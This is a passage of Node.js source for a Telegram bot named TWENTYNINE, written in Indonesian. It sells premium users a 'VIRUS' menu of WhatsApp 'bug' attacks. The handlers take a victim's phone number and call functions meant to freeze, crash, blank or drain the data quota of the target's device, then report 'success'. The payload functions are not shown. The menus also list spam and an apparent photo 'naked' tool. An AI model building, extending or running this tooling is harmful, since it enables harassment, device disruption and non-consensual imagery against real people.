         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}


//----- ( RANDOM IMAGE )-----\\
function getRandomImage() {
        const images = [
        "https://litter.catbox.moe/jjphds06zx0y5zp7.jpg", 
        "https://litter.catbox.moe/jjphds06zx0y5zp7.jpg", 
        "https://litter.catbox.moe/jjphds06zx0y5zp7.jpg", 
        "https://litter.catbox.moe/jjphds06zx0y5zp7.jpg", 
  ];
  return images[Math.floor(Math.random() * images.length)];
}

///----- ( FUNCTION COLDOWN )---\\\
  let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "🪧 ☇ Format : /setjeda 5m ";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


async function checkControlStatus() {
  try {
    const res = await axios.get(CONTROL_URL);
    const status = res.data.trim().toLowerCase();
    BOT_ACTIVE = status === "on";

    
  } catch (err) {
    console.log(chalk.red("⚠️ Gagal membaca control.txt"));
    BOT_ACTIVE = false;
  }
}
setInterval(checkControlStatus, 10 * 1000);
checkControlStatus();

//FUNGSI DELAY\\
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
                                  
// --------------- ( Case Or Bot on text Area ) --------------- \\
bot.onText(/^\/verip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputToken = match[1]?.trim();

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @iiframijud1");
  }
  
  if (!inputToken) {
    return bot.sendMessage(
      chatId,
      "🔑 Format salah!\n Format : /verip <token>"
    );
  }

  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL);
    const validTokens = res.data.tokens || [];

    if (validTokens.includes(inputToken)) {

      if (!verifiedData.tokenVerified.includes(chatId)) {
        verifiedData.tokenVerified.push(chatId);
        saveVerifiedData(verifiedData);
      }

      return bot.sendMessage(
        chatId,
        "🔓 Token berhasil diaktifkan!\nGunakan /pw <pasword> untuk lanjut"
      );

    } else {
      return bot.sendMessage(chatId, "❌ Token tidak valid!");
      setTimeout(() => process.exit(0), 1200);
    }

  } catch (err) {
    return bot.sendMessage(chatId, "⚠️ Tidak bisa mengecek token.");
    
  }
});


bot.onText(/\/pw (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17");
  }
  
  if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 Kamu belum verifikasi token!\nFormat : /verip <token>"
    );
  }

  if (!GLOBAL_PASSWORD) {
    return bot.sendMessage(chatId, "⚠️ Password belum dimuat.");
  }

  if (input === GLOBAL_PASSWORD) {

    if (!verifiedData.fullyVerified.includes(chatId)) {
      verifiedData.fullyVerified.push(chatId);
      saveVerifiedData(verifiedData);
    }

    return bot.sendMessage(
      chatId,
      "🔓 Password benar!\nKetik /start untuk membuka menu utama."
    );

  } else {
    return bot.sendMessage(chatId, "❌ Password salah!");
  }
});


 bot.onText(/\/start/, async (msg) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const date = getCurrentDate();
 const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
 const memoryStatus = formatMemory();
 const randomImage = getRandomImage();
 const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
 const mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
 const ownerid = config.OWNER_ID
 const chatType = msg.chat.type;
 const audio = ("DarkNight.mp3");
 
 if (isGroupOnly() && chatType === 'private') { return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.'); }
   
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
    
      
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
      const iiftzy =  await bot.sendPhoto(chatId, randomImage, {
        caption: `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api
 
「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `, 

            parse_mode: "HTML",
              reply_markup: {
              inline_keyboard: [
              [
                { text: "「 ♰ 」ACCSES  ", callback_data: "owner1"}, 
                { text: "「 ♰ 」TOOLS", callback_data: "mdmenu" },
              ], 
              [
                { text:"「 ♰ 」VIRUS", callback_data: "viruskorona" }, 
              ],
              [
                { text: "「 ♰ 」FRIENDS", callback_data: "friends" }, 
              ], 
           ]
           }
           });
          
  
       await bot.sendAudio(chatId, audio , {
            title: "🎧 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄",
            performer: "nana",
            caption: `𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄`,
            reply_to_message_id: iiftzy.message_id,
        });
});


   bot.on("callback_query", (callbackQuery) => {
          const chatId = callbackQuery.message.chat.id;
          const messageId = callbackQuery.message.message_id;
          const data = callbackQuery.data;
          const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
          const newImage = getRandomImage();
          const runtime = getBotRuntime();
          const memoryStatus = formatMemory();
          const date = getCurrentDate();
          const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
          const mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
          const ownerid = config.OWNER_ID
          
          let newCaption = "";
          let newButtons = [];

          if (data === "viruskorona") {
         newCaption = `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api
 
<blockquote>「 ⸸ 」VIRUS ☇ OPTION</blockquote>
  ✮ /DelayVisible 628xx - Delay visible
  ✮ /Delayinvisible 628xx -  Delay Invisible
  ✮ /Blank 628xx - blank click
  ✮ /Buldozer 628xx - Sedot kouta
  ✮ /Freze 628xx - freze chat
  ✮ /UiSystem - Ui Sistem 
  ✮ /notif - Blank Notif
  ✮ /Force - Force Close Click
  ▢  /testfunc - target,loop - reply js
  ▢  /extractfunc - ambil celah func
 
「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
newButtons = [
     [
           { text:"「 ⸸ 」BACK TO", callback_data: "mainmenu" }
     ], 
     ];
    
       } else if (data === "owner1") {
        newCaption = `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api
         
<blockquote>「 ⸸ 」ACCSES ☇ MENU </blockquote>
 オ /addprem - Add premium user
 オ /delprem - delete premium users
 オ /addadmin - add admin user
 オ /deladmin - delete admin users
 オ /listprem - list user premium
 オ /setjeda 1m - coldown 
 オ /gruponly on|of
 オ /addsender 628xx - addsender number
 オ /delsender 628xx - delsender number
 オ /listsender
 オ /block - block command
 オ /unblock - unblock command
 オ /listblock - list command block
 
「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
newButtons = [
          [
          { text: "「 ⸸ 」BACK TO", callback_data: "mainmenu" } 
          ], 
          ];
          
            } else if (data === "friends") {
           newCaption = `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api
           
<blockquote>「 ⸸ 」FRIENDS </blockquote>
 〣 @nana [ DEV SCRIPT]
 
 
「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
newButtons = [
           [
           { text: "「 ⸸ 」BACK TO", callback_data: "mainmenu" }
           ], 
           ];
           
             } else if (data === "mdmenu") {
             newCaption = `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api
                         
<blockquote>「 ⸸ 」TOOLS ☇ MENU </blockquote>
 ✵ /chat - text - hubungi owner
 ✵ /cekid 
 ✵ /cvid - teks to vidio
 ✵ /tourl - media
 ✵ /play - lagu
 ✵ /enchard - reply file .js
 ✵ /getcode - link
 ✵ /nglspam
 ✵ /tiktok - url
 ✵ /cekip 
 ✵ /hytamkan - reply photo
 ✵ /iqc - Text - Ss Iphone
 ✵ /tts - tiktok search
 ✵ /nulis - text
 ✵ /pinterest - teks
 ✵ /tonaked - reply gambar
 ✵ /info - reply user
 ✵ /script - Harga Script
 ✵ /tebakkata
 ✵ /tebakgambar
 ✵ /tebakbendera
 ✵ /tebakkalimat
 ✵ /tebaktebakan
 ✵ /skip 
 
「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
newButtons = [
             [
             { text: "「 ⸸ 」BACK TO", callback_data: "mainmenu" }, { text: "「 ⸸ 」TOOLS ☇ 2", callback_data: "mdmenu2"}, { text: "「 ⸸ 」GROUP MENU", callback_data: "grupmenu"}
             ], 
             ];
} else if (data === "grupmenu") {
newCaption = `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api         
 
<blockquote>「 ⸸ 」GROUP MENU</blockquote>
▢ /ban
▢ /unband
▢ /mute
▢ /unmute
▢ /kick
▢ /open|close
▢ /setwelcome
▢ /antilink on|of

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
newButtons = [
             [
             { text: "「 ⸸ 」BACK TO", callback_data: "mainmenu" }, 
             { text: "「 ⸸ 」TOOLS ☇ MENU 1", callback_data: "mdmenu"}
             ], 
             ];                          
     } else if (data === "mdmenu2") {
       newCaption = `
<blockquote>「 ⸸ 」𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api         
 
<blockquote>「 ⸸ 」TOOLS ☇ MENU 2</blockquote>
♰ /cekpacar - random
♰ /cekcantik - random
♰ /cekmiskin - random
♰ /cekmati - random
♰ /ceksabar - random
♰ /cektolol - random
♰ /cekkhodam - random
♰ /cekkaya - random
♰ /cekjanda - random
♰ /cektampan - random
♰ /ceksedangapa - random
♰ /profil
♰ /cekaura
♰ /sticker - Photo To Sticker
♰ /ping - respon bot
♰ /script - list harga script twentynine 

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
newButtons = [
             [
             { text: "「 ⸸ 」BACK TO", callback_data: "mainmenu" }, 
             { text: "「 ⸸ 」TOOLS ☇ MENU 1", callback_data: "mdmenu"}
             ], 
             ];
                          
               } else if (data === "mainmenu") {
              newCaption = `
<blockquote>「 ⸸ 」Dark ☇ Night</blockquote>

 ᯤ Botname : 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄
 ᯤ Author : @nanaYa17
 ᯤ Version : 1
 ᯤ Framework : node-telegram-bot-api
 
「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `,           
         newButtons = [
              [
                { text: "「 ♰ 」ACCSES  ", callback_data: "owner1"}, 
                { text: "「 ♰ 」TOOLS", callback_data: "mdmenu" },
              ], 
              [
                { text: "「 ♰ 」VIRUS", callback_data: "viruskorona" }, 
              ],
              [
                { text: "「 ♰ 」FRIENDS", callback_data: "friends" }, 
              ], 
              ];
              }
  bot.editMessageMedia(
            {
        type: "photo",
        media: newImage,
        caption: newCaption,
            parse_mode: "HTML"
            },
            { chat_id: chatId, message_id: messageId }
            ).then(() => {
            bot.editMessageReplyMarkup(
            { inline_keyboard: newButtons },
            { chat_id: chatId, message_id: messageId }
            );
            }).catch((err) => {
            console.error("Error editing message:", err);
            });
            });



//=============( CASE BUG )===============\\ 
bot.onText(/\/Delayinvisible (\d+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const userId = msg.from.id;
 const date = getCurrentDate();
 const targetNumber = match[1];
 const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
 const target = `${formattedNumber}@s.whatsapp.net`;
 const randomImage = getRandomImage();
 const cooldown = checkCooldown(userId);
 const chatType = msg.chat.type;
 const isPremium = await premium (senderId);
 const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            
    if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
     }
   
    if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
  
   if (blacklistedCommands.includes('/delayinvisible')) {
  return bot.sendMessage(chatId, '⛔ COMAND INI DILARANG OLEH OWNER!');
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ GHOST PRIDE ⎭ ⊰―═⬡</blockquote>       
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Delay invisible
☇ Status : Proses.. 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await invisible(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ GHOST PRIDE ⎭ ⊰―═⬡</blockquote>   
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Delay invisible
☇ Status : Sucses... 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/Blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium (senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

   if (isGroupOnly() && chatType === 'private') {
   return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

   
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
  
   if (blacklistedCommands.includes('/blank')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Cek premium
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Blank Click
☇ Status : Proses... 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");    
    await blankkkk(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Blank device
☇ Status : Sucses.. 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/DelayVisible (\d+)/, async (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
const userId = msg.from.id;
const date = getCurrentDate();
const targetNumber = match[1];
const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
const target = `${formattedNumber}@s.whatsapp.net`;
const randomImage = getRandomImage();
const cooldown = checkCooldown(userId);
const chatType = msg.chat.type;
const isPremium = await premium (senderId);
const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

    if (isGroupOnly() && chatType === 'private') {
      return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

    
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
  
  if (blacklistedCommands.includes('/delayvisible')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Cek premium
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Delay Visible
☇ Status : Proses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `, 
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delaybos(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Delay Visible
☇ Status : Sucses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});     

bot.onText(/\/Buldozer (\d+)/, async (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
const userId = msg.from.id;
const date = getCurrentDate();
const targetNumber = match[1];
const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
const target = `${formattedNumber}@s.whatsapp.net`;
const randomImage = getRandomImage();
const cooldown = checkCooldown(userId);
const chatType = msg.chat.type;
const isPremium = await premium (senderId);
const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }
    
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
  
  if (blacklistedCommands.includes('/buldozer')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Cek premium
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Sedot Kouta
☇ Status : Proses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await sepong(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Sedot Kouta
☇ Status : Sucses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025`, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/Force (\d+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const userId = msg.from.id;
 const date = getCurrentDate();
 const targetNumber = match[1];
 const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
 const target = `${formattedNumber}@s.whatsapp.net`;
 const randomImage = getRandomImage();
 const cooldown = checkCooldown(userId);
 const chatType = msg.chat.type;
 const isPremium = await premium (senderId);
 const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
 
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/force')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}
   
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  

       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
